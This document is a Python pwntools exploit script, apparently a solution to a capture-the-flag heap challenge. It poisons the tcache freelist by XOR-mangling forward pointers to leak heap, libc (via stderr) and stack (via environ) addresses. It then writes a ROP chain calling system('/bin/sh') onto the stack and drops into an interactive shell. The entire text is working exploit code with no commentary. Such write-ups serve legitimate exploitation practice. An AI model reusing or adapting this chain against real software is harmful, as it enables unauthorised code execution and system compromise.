from pwn import *

exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x0000000000401328
#            c
#            c 22
#            ''')

def book(choice, size, note = b'chino'):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))
    if choice == 1:
        r.sendlineafter(b'Size: ', str(size).encode('utf-8'))
    r.sendafter(b'Content: ', note)
    
def choice(choice):
    r.sendlineafter(b'> ', str(choice).encode('utf-8'))
    
pop_rdi = 0x0000000000401563   
ret     = 0x000000000040101a

size = 0x30
book(1, size)
choice(3)
choice(4)
r.recvuntil(b'Content: ')
fd_pointer = r.recv(2)
fd_pointer = u32(fd_pointer + b'\x00'*2)
print(hex(fd_pointer))
book(2, size, b'\x00'*16)
choice(3)

new_fd_pointer = fd_pointer^exe.sym['stderr']
book(2, size, p64(new_fd_pointer))
book(1, size)
book(1, size, b'\xa0')
choice(4)
r.recvuntil(b'Content: ')
libc_leak = r.recv(6)
libc.address = u64(libc_leak + b'\x00'*2) - libc.sym['_IO_2_1_stderr_']
print(hex(libc.address))

book(1, size)
choice(3)
book(2, size, b'\x00'*16)
choice(3)
print(hex(libc.sym['environ']))
new_fd_pointer = fd_pointer^(libc.sym['environ']-0x10)
book(2, size, p64(new_fd_pointer))
book(1, size)
book(1, size, b'a'*13 + b'bcd')
choice(4)
r.recvuntil(b'abcd')
stack = r.recv(6)
stack = u64(stack + b'\x00'*2)
print(hex(stack))

size = 0x300
new_fd_pointer = fd_pointer^(stack-0x208)
book(1, size)
choice(3)
book(2, size, b'\x00'*16)
choice(3)
book(2, size, p64(new_fd_pointer))
book(1, size)
payload = b'a'*184 + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh'))) + p64(ret) + p64(libc.sym['system'])
book(1, size, payload)

r.interactive()